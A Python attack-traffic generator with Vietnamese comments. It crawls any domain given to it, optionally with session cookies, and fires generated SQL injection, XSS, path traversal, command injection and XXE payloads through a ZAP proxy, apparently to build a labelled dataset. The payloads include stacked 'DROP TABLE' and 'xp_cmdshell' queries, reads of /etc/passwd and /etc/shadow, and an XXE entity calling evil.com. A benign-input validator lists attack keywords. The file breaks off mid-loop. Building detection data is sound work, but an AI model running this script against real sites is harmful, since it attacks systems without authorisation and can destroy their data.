#!/usr/bin/env python3
"""
PHASE 1: COMPLETE WORKFLOW - CRAWL → ATTACK → EXPORT
=====================================================
✅ Step 1: Direct crawl với requests (hỗ trợ cookie authentication)
✅ Step 2: Feed URLs vào ZAP proxy để capture
✅ Step 3: Generate và gửi attack payloads qua ZAP
✅ Step 4: Generate benign traffic
✅ Step 5: Export to CSV

PHƯƠNG PHÁP MỚI:
- Crawl trực tiếp bằng requests (không phụ thuộc ZAP spider)
- Hỗ trợ cookie để crawl authenticated pages
- Hoạt động với BẤT KỲ domain nào trên internet
- ZAP chỉ dùng để capture traffic và log

Compatible với run_pipeline.sh
Output: /output/phase1_baseline.csv
"""
import os
import csv
import time
import random
import requests
import urllib.parse
import hashlib
import re
from datetime import datetime
import sys
import warnings
from html.parser import HTMLParser
from collections import deque

warnings.filterwarnings('ignore', message='Unverified HTTPS request')
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass

try:
    from zapv2 import ZAPv2
except ImportError:
    print("❌ Cần cài: pip install python-owasp-zap-v2.4")
    sys.exit(1)

# ====================== CONFIG ======================
# TARGET_URL có thể là full URL (https://example.com) hoặc domain (example.com)
RAW_TARGET = os.getenv('TARGET_URL', 'http://testaspnet.vulnweb.com')

# Normalize target URL - đảm bảo có scheme
if RAW_TARGET.startswith('http://') or RAW_TARGET.startswith('https://'):
    TARGET = RAW_TARGET
else:
    # Nếu chỉ có domain, thêm http:// mặc định
    TARGET = f"http://{RAW_TARGET}"

# Optional cookie cho authenticated crawling (có thể đăng nhập trước)
# Format: "session=abc123; auth_token=xyz789" hoặc để trống
COOKIE = os.getenv('COOKIE', '')

ZAP_HOST = os.getenv('ZAP_HOST', 'zap')
ZAP_PORT = os.getenv('ZAP_PORT', '8080')
PROXY = f"http://{ZAP_HOST}:{ZAP_PORT}"

# Crawl settings
MAX_CRAWL_DEPTH = int(os.getenv('MAX_CRAWL_DEPTH', '3'))
MAX_URLS_TO_CRAWL = int(os.getenv('MAX_URLS_TO_CRAWL', '100'))
CRAWL_TIMEOUT = int(os.getenv('CRAWL_TIMEOUT', '10'))

OUTPUT_DIR = os.getenv('OUTPUT_DIR', '/output')
FINAL_CSV = os.getenv('PHASE1_CSV', os.path.join(OUTPUT_DIR, "phase1_baseline.csv"))
URL_FILE = os.path.join(OUTPUT_DIR, "crawled_urls.txt")
PARAM_URL_FILE = os.path.join(OUTPUT_DIR, "param_urls.txt")

MAX_URLS_AJAX = int(os.getenv('MAX_URLS_AJAX', '8'))
MAX_URLS_ATTACK = int(os.getenv('MAX_URLS_ATTACK', '5'))

# Stats
stats = {
    'spider_urls': 0,
    'ajax_urls': 0,
    'param_urls': 0,
    'SQLI': 0,
    'XSS': 0,
    'LFI': 0,
    'RCE': 0,
    'XXE': 0,
    'BENIGN': 0,
    'exported': 0
}

# Session cho direct requests (KHÔNG qua proxy - để crawl)
direct_session = requests.Session()
direct_session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive"
})

# Session cho requests qua ZAP proxy (để capture traffic)
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Connection": "keep-alive"
})

# Thêm cookie nếu được cung cấp (để crawl authenticated pages)
if COOKIE:
    direct_session.headers.update({"Cookie": COOKIE})
    session.headers.update({"Cookie": COOKIE})

# ====================== UTILS ======================
def log(msg, level="INFO"):
    """Logging"""
    colors = {
        "INFO": "\033[94m",
        "OK": "\033[92m",
        "WARNING": "\033[93m",
        "ERROR": "\033[91m"
    }
    reset = "\033[0m"
    color = colors.get(level, "")
    timestamp = datetime.now().strftime('%H:%M:%S')
    print(f"{color}[{timestamp}] [{level}] {msg}{reset}", flush=True)

def clean_multiline(text):
    """Clean text cho CSV"""
    if not text:
        return ""
    return str(text).replace("\n", " ").replace("\r", "").strip()

def has_param(url):
    """Check if URL has parameters"""
    return urllib.parse.urlparse(url).query != ""

def url_priority(url):
    """Calculate URL priority for attack"""
    score = 0
    path = urllib.parse.urlparse(url).path.lower()
    
    if any(k in path for k in ["search", "login", "contact", "register", "api"]): 
        score += 10
    if any(k in path for k in ["blog", "post", "comment"]): 
        score += 5
    if has_param(url): 
        score += 20
    
    return score

# ====================== DIRECT CRAWLER (KHÔNG PHỤ THUỘC ZAP) ======================
class LinkExtractor(HTMLParser):
    """Extract links from HTML"""
    def __init__(self, base_url):
        super().__init__()
        self.base_url = base_url
        self.base_domain = urllib.parse.urlparse(base_url).netloc
        self.links = set()
        self.forms = []
        self.current_form = None
    
    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        
        # Extract links
        if tag == 'a' and 'href' in attrs_dict:
            self._add_link(attrs_dict['href'])
        elif tag == 'form':
            action = attrs_dict.get('action', '')
            method = attrs_dict.get('method', 'get').upper()
            self.current_form = {'action': action, 'method': method, 'inputs': []}
        elif tag == 'input' and self.current_form is not None:
            input_type = attrs_dict.get('type', 'text')
            input_name = attrs_dict.get('name', '')
            if input_name and input_type not in ['submit', 'button', 'image', 'reset']:
                self.current_form['inputs'].append({
                    'name': input_name,
                    'type': input_type,
                    'value': attrs_dict.get('value', '')
                })
        elif tag in ['script', 'link', 'img', 'iframe'] and 'src' in attrs_dict:
            self._add_link(attrs_dict['src'])
        elif tag == 'link' and 'href' in attrs_dict:
            self._add_link(attrs_dict['href'])
    
    def handle_endtag(self, tag):
        if tag == 'form' and self.current_form is not None:
            if self.current_form['inputs']:
                self.forms.append(self.current_form)
            self.current_form = None
    
    def _add_link(self, href):
        if not href or href.startswith(('#', 'javascript:', 'mailto:', 'tel:', 'data:')):
            return
        
        try:
            # Normalize URL
            if href.startswith('//'):
                href = 'https:' + href
            elif href.startswith('/'):
                parsed_base = urllib.parse.urlparse(self.base_url)
                href = f"{parsed_base.scheme}://{parsed_base.netloc}{href}"
            elif not href.startswith('http'):
                href = urllib.parse.urljoin(self.base_url, href)
            
            # Check same domain
            parsed = urllib.parse.urlparse(href)
            if parsed.netloc == self.base_domain:
                # Remove fragment
                clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                if parsed.query:
                    clean_url += f"?{parsed.query}"
                self.links.add(clean_url)
        except:
            pass

def direct_crawl():
    """
    STEP 1: Direct crawl bằng requests (KHÔNG phụ thuộc ZAP spider)
    Hoạt động với BẤT KỲ domain nào trên internet
    """
    log("="*80)
    log("STEP 1: DIRECT CRAWL (Independent)", "OK")
    log("="*80)
    log(f"  Target: {TARGET}")
    log(f"  Max depth: {MAX_CRAWL_DEPTH}")
    log(f"  Max URLs: {MAX_URLS_TO_CRAWL}")
    if COOKIE:
        log(f"  🍪 Cookie: Enabled (authenticated mode)", "OK")
    
    discovered_urls = set()
    discovered_forms = []
    visited = set()
    queue = deque([(TARGET, 0)])  # (url, depth)
    
    domain = urllib.parse.urlparse(TARGET).netloc
    
    while queue and len(discovered_urls) < MAX_URLS_TO_CRAWL:
        url, depth = queue.popleft()
        
        if url in visited or depth > MAX_CRAWL_DEPTH:
            continue
        
        visited.add(url)
        
        try:
            log(f"  [{len(discovered_urls):3d}] Crawling: {url[:60]}...")
            
            resp = direct_session.get(url, timeout=CRAWL_TIMEOUT, verify=False, 
                                       allow_redirects=True)
            
            if resp.status_code == 200:
                discovered_urls.add(url)
                
                # Parse HTML
                content_type = resp.headers.get('Content-Type', '')
                if 'text/html' in content_type:
                    try:
                        parser = LinkExtractor(url)
                        parser.feed(resp.text)
                        
                        # Add discovered links to queue
                        for link in parser.links:
                            if link not in visited and domain in link:
                                queue.append((link, depth + 1))
                                discovered_urls.add(link)
                        
                        # Collect forms
                        for form in parser.forms:
                            form['page_url'] = url
                            discovered_forms.append(form)
                    except:
                        pass
            
            time.sleep(0.2)  # Rate limiting
            
        except requests.exceptions.Timeout:
            log(f"  Timeout: {url[:50]}...", "WARNING")
        except Exception as e:
            pass
    
    # Add common paths if we found few URLs
    if len(discovered_urls) < 10:
        log("  Adding common paths...", "INFO")
        common_paths = [
            '/', '/login', '/admin', '/search', '/contact', '/about',
            '/register', '/signup', '/api', '/user', '/account',
            '/products', '/services', '/blog', '/news', '/help'
        ]
        scheme = 'https' if TARGET.startswith('https') else 'http'
        for path in common_paths:
            discovered_urls.add(f"{scheme}://{domain}{path}")
    
    # Separate URLs with parameters
    param_urls = [u for u in discovered_urls if has_param(u)]
    
    stats['spider_urls'] = len(discovered_urls)
    stats['param_urls'] = len(param_urls)
    
    log(f"\n  ✅ Direct crawl complete!", "OK")
    log(f"     Total URLs: {len(discovered_urls)}")
    log(f"     With params: {len(param_urls)}")
    log(f"     Forms found: {len(discovered_forms)}")
    
    # Save URLs
    with open(URL_FILE, "w") as f:
        for u in discovered_urls:
            f.write(u + "\n")
    
    if param_urls:
        with open(PARAM_URL_FILE, "w") as f:
            for u in param_urls:
                f.write(u + "\n")
    
    return list(discovered_urls), param_urls, discovered_forms

# ====================== ZAP CONNECTION ======================
def retry_zap_call(func, max_retries=3, delay=2):
    """Retry wrapper for ZAP API calls with exponential backoff"""
    for attempt in range(max_retries):
        try:
            return func()
        except requests.exceptions.ProxyError as e:
            if "Connection refused" in str(e) or "Failed to establish" in str(e):
                if attempt < max_retries - 1:
                    wait_time = delay * (2 ** attempt)  # Exponential backoff
                    log(f"ZAP connection lost, retrying in {wait_time}s... ({attempt+1}/{max_retries})", "WARNING")
                    time.sleep(wait_time)
                else:
                    log(f"ZAP connection failed after {max_retries} attempts", "ERROR")
                    raise
            else:
                raise
        except Exception as e:
            if attempt < max_retries - 1:
                log(f"ZAP API error, retrying... ({attempt+1}/{max_retries}): {e}", "WARNING")
                time.sleep(delay)
            else:
                raise
    return None

def get_zap():
    """Connect to ZAP"""
    log(f"Connecting to ZAP at {PROXY}...")
    
    for attempt in range(1, 41):
        try:
            zap = ZAPv2(
                apikey='',
                proxies={'http': PROXY, 'https': PROXY}
            )
            version = zap.core.version
            log(f"✅ Connected to ZAP v{version}", "OK")
            time.sleep(2)
            return zap
        except Exception as e:
            if attempt % 5 == 0:
                log(f"Attempt {attempt}/40 - Waiting for ZAP...", "WARNING")
            time.sleep(3)
    
    log("❌ Cannot connect to ZAP!", "ERROR")
    sys.exit(1)

def setup_zap_authentication(zap):
    """
    Cấu hình ZAP để sử dụng cookie authentication
    Điều này cho phép ZAP spider crawl các trang sau khi đăng nhập
    """
    if not COOKIE:
        log("No cookie provided, using anonymous mode", "INFO")
        return None
    
    log("="*80)
    log("🍪 SETTING UP ZAP AUTHENTICATION", "OK")
    log("="*80)
    
    try:
        domain = urllib.parse.urlparse(TARGET).netloc
        context_name = f"auth_{domain}"
        
        # 1. Tạo context mới
        log(f"  Creating context: {context_name}")
        try:
            # Xóa context cũ nếu có
            contexts = zap.context.context_list
            if context_name in str(contexts):
                zap.context.remove_context(context_name)
        except:
            pass
        
        context_id = zap.context.new_context(context_name)
        log(f"  Context ID: {context_id}")
        
        # 2. Include target URL trong context
        escaped_domain = domain.replace('.', '\\.')
        include_regex = f".*{escaped_domain}.*"
        zap.context.include_in_context(context_name, include_regex)
        log(f"  Included regex: {include_regex}")
        
        # 3. Tạo HTTP session với cookie
        log(f"  Setting up HTTP session with cookie...")
        
        # Parse cookies
        cookies = {}
        for part in COOKIE.split(';'):
            part = part.strip()
            if '=' in part:
                key, value = part.split('=', 1)
                cookies[key.strip()] = value.strip()
        
        # Tạo session site
        site = f"{urllib.parse.urlparse(TARGET).scheme}://{domain}"
        
        try:
            # Thêm session tokens (các cookie names cần track)
            for cookie_name in cookies.keys():
                try:
                    zap.httpsessions.add_session_token(site, cookie_name)
                    log(f"    Added session token: {cookie_name}")
                except:
                    pass
            
            # Tạo session mới
            session_name = "authenticated_session"
            try:
                zap.httpsessions.create_empty_session(site, session_name)
                log(f"  Created session: {session_name}")
            except:
                pass
            
            # Set session values
            for cookie_name, cookie_value in cookies.items():
                try:
                    zap.httpsessions.set_session_token_value(
                        site, session_name, cookie_name, cookie_value
                    )
                    log(f"    Set {cookie_name}={cookie_value[:20]}...")
                except Exception as e:
                    log(f"    Warning setting {cookie_name}: {e}", "WARNING")
            
            # Set active session
            try:
                zap.httpsessions.set_active_session(site, session_name)
                log(f"  ✓ Activated session: {session_name}", "OK")
            except:
                pass
                
        except Exception as e:
            log(f"  HTTP Session setup warning: {e}", "WARNING")
        
        # 4. Thêm cookie vào replacer rules (backup method)
        log(f"  Setting up cookie header replacer...")
        try:
            # Xóa rule cũ nếu có
            try:
                zap.replacer.remove_rule("AuthCookie")
            except:
                pass
            
            # Thêm rule mới để inject cookie header
            zap.replacer.add_rule(
                description="AuthCookie",
                enabled=True,
                matchtype="REQ_HEADER",
                matchregex=False,
                matchstring="Cookie",
                replacement=COOKIE,
                initiators=""
            )
            log(f"  ✓ Cookie replacer rule added", "OK")
        except Exception as e:
            log(f"  Replacer warning: {e}", "WARNING")
        
        # 5. Truy cập target để thiết lập session trong ZAP
        log(f"  Accessing target with cookie...")
        try:
            # Gửi request với cookie qua ZAP proxy
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Cookie": COOKIE
            }
            resp = requests.get(TARGET, headers=headers, 
                               proxies={'http': PROXY, 'https': PROXY},
                               verify=False, timeout=30)
            log(f"  ✓ Target accessed: HTTP {resp.status_code}", "OK")
        except Exception as e:
            log(f"  Target access warning: {e}", "WARNING")
        
        log(f"\n  ✅ ZAP Authentication configured!", "OK")
        log(f"     Context: {context_name}")
        log(f"     Cookies: {len(cookies)} values set")
        
        return context_name
        
    except Exception as e:
        log(f"Authentication setup error: {e}", "ERROR")
        import traceback
        traceback.print_exc()
        return None

# ====================== FEED URLs TO ZAP ======================
def feed_urls_to_zap(urls):
    """Feed discovered URLs to ZAP proxy để capture traffic"""
    log("\n" + "="*80)
    log("STEP 2: FEED URLs TO ZAP", "OK")
    log("="*80)
    log(f"  Sending {len(urls)} URLs through ZAP proxy...")
    
    success = 0
    for i, url in enumerate(urls[:50], 1):  # Limit to 50 URLs
        try:
            session.get(url, proxies={'http': PROXY, 'https': PROXY},
                       verify=False, timeout=10)
            success += 1
        except:
            pass
        
        if i % 10 == 0:
            log(f"  Progress: {i}/{min(len(urls), 50)}")
        
        time.sleep(0.1)
    
    log(f"  ✅ Fed {success} URLs to ZAP", "OK")
    return success

# ====================== LEGACY SPIDER (FALLBACK) ======================
def spider_crawl(zap, context_name=None):
    """STEP 1: Spider Crawl to discover URLs với context authentication"""
    log("="*80)
    log("STEP 1: ZAP SPIDER CRAWL", "OK")
    log("="*80)
    
    if context_name:
        log(f"  Using authenticated context: {context_name}", "OK")

    try:
        # Bước 1: Truy cập URL trước để ZAP có thể xử lý (quan trọng với HTTPS)
        log(f"  Accessing target URL first: {TARGET}")
        try:
            # Gửi request với cookie qua ZAP proxy
            headers = {"Cookie": COOKIE} if COOKIE else {}
            headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            
            resp = requests.get(TARGET, headers=headers,
                               proxies={'http': PROXY, 'https': PROXY},
                               verify=False, timeout=30)
            log(f"  ✓ Target accessed: HTTP {resp.status_code}", "OK")
            time.sleep(2)
        except Exception as e:
            log(f"  Target access warning: {e}", "WARNING")
            try:
                zap.urlopen(TARGET)
                time.sleep(2)
            except:
                pass
        
        # Bước 2: Bắt đầu spider với context (nếu có)
        if context_name:
            log(f"  Starting spider with context: {context_name}")
            scan_id = zap.spider.scan(url=TARGET, contextname=context_name)
        else:
            scan_id = zap.spider.scan(url=TARGET)
        
        log(f"  Spider scan started: {scan_id}")
        
        for _ in range(30):  # Tăng thời gian chờ
            status = zap.spider.status(scan_id)
            log(f"  Spider progress: {status}%")
            if int(status) >= 100: 
                break
            time.sleep(5)
        
        zap.spider.stop(scan_id)
        time.sleep(3)

        urls = zap.core.urls()
        domain = urllib.parse.urlparse(TARGET).netloc
        domain_urls = [u for u in urls if domain in u]
        
        # Fallback: Nếu spider không tìm được URL, thử manual crawl
        if not domain_urls:
            log("Spider found no URLs, trying manual discovery...", "WARNING")
            domain_urls = manual_url_discovery(zap, domain)
        
        stats['spider_urls'] = len(domain_urls)
        log(f"✅ Spider found {len(domain_urls)} URLs", "OK")
        
        # Save URLs
        with open(URL_FILE, "w") as f:
            for u in domain_urls: 
                f.write(u + "\n")
        
        return domain_urls
        
    except Exception as e:
        log(f"Spider error: {e}", "ERROR")
        return []

def manual_url_discovery(zap, domain):
    """Fallback: Manual URL discovery khi spider thất bại"""
    log("  Performing manual URL discovery...", "INFO")
    discovered_urls = set()
    
    # Thử truy cập target trực tiếp
    try:
        resp = session.get(TARGET, proxies={'http': PROXY, 'https': PROXY}, 
                          verify=False, timeout=30)
        discovered_urls.add(TARGET)
        
        # Parse HTML để tìm links
        from html.parser import HTMLParser
        
        class LinkParser(HTMLParser):
            def __init__(self):
                super().__init__()
                self.links = []
            
            def handle_starttag(self, tag, attrs):
                if tag in ['a', 'form', 'iframe', 'script', 'link']:
                    for attr, value in attrs:
                        if attr in ['href', 'src', 'action'] and value:
                            self.links.append(value)
        
        parser = LinkParser()
        parser.feed(resp.text)
        
        # Normalize URLs
        for link in parser.links:
            try:
                if link.startswith('http'):
                    if domain in link:
                        discovered_urls.add(link.split('#')[0].split('?')[0])
                elif link.startswith('/'):
                    # Absolute path
                    scheme = 'https' if TARGET.startswith('https') else 'http'
                    full_url = f"{scheme}://{domain}{link}"
                    discovered_urls.add(full_url.split('#')[0])
                elif not link.startswith(('javascript:', 'mailto:', '#', 'data:')):
                    # Relative path
                    base = TARGET.rstrip('/')
                    full_url = f"{base}/{link}"
                    discovered_urls.add(full_url.split('#')[0])
            except:
                pass
        
        log(f"  ✓ Found {len(discovered_urls)} URLs via manual crawl", "OK")
        
        # Truy cập các URL tìm được qua proxy để ZAP capture
        for url in list(discovered_urls)[:20]:  # Giới hạn 20 URLs
            try:
                session.get(url, proxies={'http': PROXY, 'https': PROXY}, 
                           verify=False, timeout=10)
                time.sleep(0.2)
            except:
                pass
        
        # Lấy lại URLs từ ZAP
        time.sleep(2)
        zap_urls = zap.core.urls()
        for u in zap_urls:
            if domain in u:
                discovered_urls.add(u)
        
    except Exception as e:
        log(f"  Manual discovery error: {e}", "WARNING")
    
    return list(discovered_urls)

# ====================== AJAX SPIDER PHASE ======================
def ajax_crawl(zap, urls):
    """STEP 2: AJAX Spider for dynamic content"""
    log("\n" + "="*80)
    log(f"STEP 2: AJAX SPIDER ({MAX_URLS_AJAX} URLs)", "OK")
    log("="*80)

    if not urls:
        log("No URLs from spider, skipping AJAX", "WARNING")
        return urls

    # Select top URLs for AJAX spider (reduced to prevent ZAP overload)
    max_ajax = min(MAX_URLS_AJAX, 5)  # Limit to 5 to prevent ZAP crash
    sorted_urls = sorted(urls, key=url_priority, reverse=True)[:max_ajax]
    
    ajax_success = 0
    for i, url in enumerate(sorted_urls, 1):
        log(f"  AJAX [{i}/{len(sorted_urls)}] → {url[:70]}...")
        
        try:
            def start_ajax():
                return zap.ajaxSpider.scan(url=url, inscope=True)
            
            retry_zap_call(start_ajax, max_retries=2, delay=3)
            
            # Wait for AJAX spider with timeout
            max_wait = 20  # Reduced from 25s
            for wait in range(max_wait):
                time.sleep(1)
                try:
                    status = retry_zap_call(lambda: zap.ajaxSpider.status, max_retries=2, delay=1)
                    if status == "stopped":
                        break
                except:
                    log(f"  Cannot check AJAX status, assuming complete", "WARNING")
                    break
            
            try:
                retry_zap_call(lambda: zap.ajaxSpider.stop(), max_retries=1, delay=1)
            except:
                pass
            
            ajax_success += 1
            time.sleep(2)
            
        except Exception as e:
            log(f"  AJAX error on URL {i}, continuing with next: {str(e)[:100]}", "WARNING")
            # Continue with next URL even if this one fails
            continue

    log(f"  ✓ AJAX processed {ajax_success}/{len(sorted_urls)} URLs", "OK")
    
    # Get final URLs with retry
    try:
        final_urls = retry_zap_call(lambda: zap.core.urls(), max_retries=3, delay=5)
        domain = urllib.parse.urlparse(TARGET).netloc
        final_domain_urls = [u for u in final_urls if domain in u]
    except Exception as e:
        log(f"Cannot retrieve final URLs from ZAP, using original URLs: {e}", "WARNING")
        final_domain_urls = urls
    
    stats['ajax_urls'] = len(final_domain_urls)
    log(f"✅ AJAX complete: {len(final_domain_urls)} URLs total", "OK")
    
    return final_domain_urls

# ====================== QUICK SCAN PHASE ======================
def quick_scan(zap, urls):
    """STEP 3: Quick scan to discover forms/parameters"""
    log("\n" + "="*80)
    log("STEP 3: QUICK SCAN (Discover Forms)", "OK")
    log("="*80)

    if not urls:
        log("No URLs, skipping scan", "WARNING")
        return [], urls

    # Scan form pages
    form_urls = [u for u in urls if any(k in u.lower() for k in ["login", "search", "contact", "comment"])][:3]
    
    if form_urls:
        for url in form_urls:
            try:
                log(f"  Scanning: {url[:70]}...")
                scan_id = retry_zap_call(lambda: zap.ascan.scan(url=url, recurse=False, scanpolicyname="Light"), max_retries=2, delay=3)
                time.sleep(10)
                retry_zap_call(lambda: zap.ascan.stop(scan_id), max_retries=1, delay=1)
            except Exception as e:
                log(f"  Scan failed, skipping: {str(e)[:50]}", "WARNING")
                pass

    time.sleep(5)
    
    # Get all URLs including discovered ones
    try:
        all_urls = retry_zap_call(lambda: zap.core.urls(), max_retries=3, delay=5)
        domain = urllib.parse.urlparse(TARGET).netloc
        domain_urls = [u for u in all_urls if domain in u]
        param_urls = [u for u in domain_urls if has_param(u)]
    except Exception as e:
        log(f"Cannot retrieve URLs from ZAP, using original list: {e}", "WARNING")
        domain_urls = urls
        param_urls = [u for u in urls if has_param(u)]

    stats['param_urls'] = len(param_urls)
    
    # Save param URLs
    with open(PARAM_URL_FILE, "w") as f:
        for u in param_urls: 
            f.write(u + "\n")

    log(f"✅ Scan complete: {len(param_urls)} parameter URLs found", "OK")
    
    return param_urls, domain_urls

# ====================== PAYLOAD GENERATORS ======================
class PayloadGenerator:
    """Generate attack payloads"""
    
    @staticmethod
    def generate_sqli_payloads(count=250):
        """Generate SQL injection payloads"""
        payloads = []
        
        # Boolean-based blind
        for i in range(50):
            val = random.randint(1000, 9999)
            payloads.extend([
                f"' AND {val}={val}--",
                f"' OR {val}={val}--",
                f"') AND {val}={val}--",
                f"')) AND {val}={val}--",
                f"' AND '{random.choice(['a','b','x'])}'='{random.choice(['a','b','x'])}",
            ])
        
        # Union-based
        for i in range(30):
            payloads.extend([
                f"' UNION SELECT NULL,NULL,{random.randint(1,100)}--",
                f"' UNION ALL SELECT 1,2,3,4,5--",
                f"1' UNION SELECT table_name FROM information_schema.tables--",
                f"' UNION SELECT @@version,NULL,NULL--",
            ])
        
        # Time-based blind
        for i in range(20):
            delay = random.randint(3, 8)
            payloads.extend([
                f"'; WAITFOR DELAY '00:00:{delay:02d}'--",
                f"' OR SLEEP({delay})--",
                f"'; SELECT pg_sleep({delay})--",
            ])
        
        # Error-based
        payloads.extend([
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
        ])
        
        # Stacked queries
        for i in range(10):
            payloads.extend([
                f"'; DROP TABLE users_{i}--",
                "'; EXEC xp_cmdshell('dir')--",
            ])
        
        return payloads[:count]
    
    @staticmethod
    def generate_xss_payloads(count=250):
        """Generate XSS payloads"""
        payloads = []
        
        # Basic XSS
        events = ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus']
        for i in range(40):
            event = random.choice(events)
            payloads.extend([
                f"<script>alert({i})</script>",
                f"<img src=x {event}=alert({i})>",
                f"<svg {event}=alert({i})>",
                f"<iframe src=javascript:alert({i})>",
                f"<body {event}=alert({i})>",
            ])
        
        # Encoded XSS
        payloads.extend([
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        ])
        
        # Filter bypass
        payloads.extend([
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<svg/onload=alert(1)>",
            "<<SCRIPT>alert(1);//<</SCRIPT>",
        ])
        
        return payloads[:count]
    
    @staticmethod
    def generate_lfi_payloads(count=200):
        """Generate LFI payloads"""
        payloads = []
        
        files = ['/etc/passwd', '/etc/shadow', 'C:\\boot.ini']
        
        for file in files:
            for depth in range(1, 8):
                traversal = '../' * depth
                payloads.append(traversal + file)
        
        payloads.extend([
            '....//....//....//etc/passwd',
            '..%2f..%2f..%2fetc%2fpasswd',
        ])
        
        return payloads[:count]
    
    @staticmethod
    def generate_rce_payloads(count=150):
        """Generate RCE payloads"""
        payloads = []
        
        commands = ['id', 'whoami', 'pwd']
        
        for cmd in commands:
            payloads.extend([
                f"; {cmd}",
                f"| {cmd}",
                f"&& {cmd}",
                f"$({cmd})",
            ])
        
        payloads.extend([
            "<?php system('id'); ?>",
            "<?php echo shell_exec('whoami'); ?>",
        ])
        
        return payloads[:count]
    
    @staticmethod
    def generate_xxe_payloads(count=100):
        """Generate XXE payloads"""
        payloads = []
        
        xxe_templates = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
        ]
        
        for i in range(count):
            payloads.append(random.choice(xxe_templates))
        
        return payloads[:count]

# ====================== BENIGN GENERATOR ======================
class BenignGenerator:
    """Generate benign requests"""
    
    @staticmethod
    def is_truly_benign(text):
        """Validate benign data"""
        if not text:
            return False
        
        text_lower = str(text).lower()
        
        dangerous_patterns = [
            'select', 'union', 'insert', "'--", ' --', '/*', 'xp_', 'waitfor',
            '<script', '</script', '<img', '<svg', 'onerror', 'alert(', 'javascript:',
            'system(', 'exec(', 'shell_exec', '&&', '||', '`', '$(', 
            '../', '/etc/', 'c:\\', '<!entity', '<?xml',
            "'='", '"="', "' or", "' and",
        ]
        
        for pattern in dangerous_patterns:
            if pattern in text_lower:
                return False
        
        special_count = sum(1 for c in text if c in '<>\'";|&$`()[]{}')
        if special_count > 2:
            return False
        
        return True
    
    @staticmethod
    def generate_benign_data(count=1000):
        """Generate truly benign data"""
        data = []
        
        safe_words = [
            'hello', 'world', 'test', 'user', 'comment', 'feedback', 'question',
            'help', 'support', 'info', 'thanks', 'great', 'nice', 'good', 'service',
            'product', 'quality', 'price', 'delivery', 'fast', 'better', 'best'
        ]
        
        # Comments (40%)
        for i in range(int(count * 0.4)):
            text = ' '.join(random.choices(safe_words, k=random.randint(3, 10)))
            text = text[0].upper() + text[1:] + '.'
            data.append(text)
        
        # Names (15%)
        first_names = ['John', 'Jane', 'Bob', 'Alice', 'Charlie']
        last_names = ['Smith', 'Johnson', 'Brown', 'Williams']
        for i in range(int(count * 0.15)):
            name = f"{random.choice(first_names)} {random.choice(last_names)}"
            data.append(name)
        
        # Emails (15%)
        for i in range(int(count * 0.15)):
            username = random.choice(safe_words) + str(random.randint(1, 999))
            email = f"{username}@example.com"
            data.append(email)
        
        # Numbers (10%)
        for i in range(int(count * 0.1)):
            data.append(str(random.randint(1, 99999)))
        
        # Search queries (20%)
        query_starters = ['how to', 'what is', 'where can I find', 'best way to']
        for i in range(int(count * 0.2)):
            query = random.choice(query_starters) + ' ' + ' '.join(random.choices(safe_words, k=2))
            data.append(query)
        
        # Validate
        validated = []
        gen = BenignGenerator()
        for item in data:
            if gen.is_truly_benign(item):
                validated.append(item)
        
        # Fill if needed
        while len(validated) < count:
            text = ' '.join(random.choices(safe_words, k=random.randint(4, 8)))
            text = text.capitalize() + '.'
            if gen.is_truly_benign(text):
                validated.append(text)
        
        return validated[:count]

# ====================== ATTACK PHASE ======================
def attack_with_payloads(zap, param_urls, all_urls):
    """STEP 4: Send attack payloads to discovered URLs"""
    log("\n" + "="*80)
    log(f"STEP 4: ATTACK PHASE (Payload Generation)", "OK")
    log("="*80)
    
    # Select best URLs
    attack_urls = param_urls[:MAX_URLS_ATTACK]
    if not attack_urls:
        log("No param URLs, using top URLs", "WARNING")
        attack_urls = sorted(all_urls, key=url_priority, reverse=True)[:MAX_URLS_ATTACK]
    
    if not attack_urls:
        log("No URLs for attack!", "ERROR")
        return
    
    log(f"Selected {len(attack_urls)} URLs for attacks")
    for i, u in enumerate(attack_urls[:3], 1):
        log(f"  {i}. {u[:70]}...")
    
    gen = PayloadGenerator()
    
    # Generate payloads
    sqli_payloads = gen.generate_sqli_payloads(250)
    xss_payloads = gen.generate_xss_payloads(250)
    lfi_payloads = gen.generate_lfi_payloads(200)
    rce_payloads = gen.generate_rce_payloads(150)
    xxe_payloads = gen.generate_xxe_payloads(100)
    
    log(f"\nGenerated payloads:")
    log(f"  SQLi: {len(sqli_payloads)}")
    log(f"  XSS: {len(xss_payloads)}")
    log(f"  LFI: {len(lfi_payloads)}")
    log(f"  RCE: {len(rce_payloads)}")
    log(f"  XXE: {len(xxe_payloads)}")
    
    param_names = ['id', 'q', 'search', 'tbComment', 'username', 'file', 'cmd']
    
    # Send SQLi
    log("\n[1/5] Sending SQLi...")
    for i, payload in enumerate(sqli_payloads, 1):
        url = random.choice(attack_urls)
        param = random.choice(param_names)
        try:
            session.post(
                url, data={param: payload},
                proxies={'http': PROXY, 'https': PROXY},
                verify=False, timeout=10
            )
            stats['SQLI'] += 1
        except:
            pass
        
        if i % 50 == 0:
            log(f"  SQLi: {i}/{len(sqli_payloads)}")
        time.sleep(0.05)
    
    # Send XSS
    log("\n[2/5] Sending XSS...")
    for i, payload in enumerate(xss_payloads, 1):
